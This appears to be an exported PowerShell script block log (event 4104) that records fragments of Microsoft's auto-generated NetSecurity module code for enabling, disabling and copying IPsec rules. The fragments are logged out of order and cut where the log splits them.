    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecQuickModeCryptoSet') -and (@('ByAssociatedNetIPsecQuickModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecQuickModeCryptoSet}, 'MSFT_NetConSecRuleQMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Enable', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Enable-NetIPsecRule' -Alias '*'
        

function Disable-NetIPsecRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]

    param(
    
    [Parameter(ParameterSetName='ByIPsecRuleName', Mandatory=$true, Position=0, ValueFromPipelineByPropertyName=$true)]
    [Alias('ID','Name')]
    [ValidateNotNull()]
    [string[]]
    ${IPsecRuleName},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.IPsecMode[]]
    ${Mode},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecIn')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${InboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [Alias('SecOut')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.SecurityPolicy[]]
    ${OutboundSecurity},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${QuickModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase2AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.KeyModule[]]
    ${KeyModule},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowWatchKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${AllowSetKey},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${RemoteTunnelHostname},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${ForwardPathLifetime},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${EncryptedTunnelBypass},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${RequireAuthorization},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${User},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Machine},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetInterfaceTypeFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallInterfaceTypeFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetProtocolPortFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallPortFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP2AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase2AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEQMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecQuickModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssoci

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (17 of 23):
', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByIPsecRuleName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallInterfaceTypeFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallPortFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase2AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('IPsecRuleName') -and (@('ByIPsecRuleName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${IPsecRuleName})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Mode') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Mode})
        $__cmdletization_queryBuilder.FilterByProperty('Mode', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('InboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${InboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('InboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('OutboundSecurity') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${OutboundSecurity})
        $__cmdletization_queryBuilder.FilterByProperty('OutboundSecurity', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('QuickModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${QuickModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('QuickModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase1AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase2AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase2AuthSet})
        $__cmdletization_queryBuilder.FilterByProperty('Phase2AuthSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('KeyModule') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${KeyModule})
        $__cmdletization_queryBuilder.FilterByProperty('KeyModule', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowWatchKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowWatchKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowWatchKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AllowSetKey') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${AllowSetKey})
        $__cmdletization_queryBuilder.FilterByProperty('AllowSetKey', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RemoteTunnelHostname') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RemoteTunnelHostname})
        $__cmdletization_queryBuilder.FilterByProperty('RemoteTunnelEndpointDNSName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForwardPathLifetime') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForwardPathLifetime})
        $__cmdletization_queryBuilder.FilterByProperty('MaxReturnPathLifetimeSeconds', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('EncryptedTunnelBypass') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${EncryptedTunnelBypass})
        $__cmdletization_queryBuilder.FilterByProperty('BypassTunnelIfEncrypted', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('RequireAuthorization') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${RequireAuthorization})
        $__cmdletization_queryBuilder.FilterByProperty('RequireAuthorization', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('User') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${User})
        $__cmdletization_queryBuilder.FilterByProperty('Users', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Machine') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Machine})
        $__cmdletization_queryBuilder.FilterByProperty('Machines', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallAddressFilter') -and (@('ByAssociatedNetFirewallAddressFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallAddressFilter}, 'MSFT_NetConSecRuleFilterByAddress', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceFilter') -and (@('ByAssociatedNetFirewallInterfaceFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceFilter}, 'MSFT_NetConSecRuleFilterByInterface', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallInterfaceTypeFilter') -and (@('ByAssociatedNetFirewallInterfaceTypeFilter') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetFirewallInterfaceTypeFilter}, 'MSFT_NetConSecRuleFilterByInterfaceType', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetFirewallPortFilter') -and (@('ByAssociatedNetFirewallPortFilter') -contains $PSC

ScriptBlock ID: a288637f-963a-46d5-a838-bde2dae2141e
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (16 of 23):
thSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByIPsecRuleName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallInterfaceFilter', 'ByAssociatedNetFirewallInterfaceTypeFilter', 'ByAssociatedNetFirewallPortFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase2AuthSet', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecQuickModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewPolicyStore')) {
            [object]$__cmdletization_value = ${NewPolicyStore}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewPolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewGPOSession')) {
            [object]$__cmdletization_value = ${NewGPOSession}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewGPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('CloneObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)
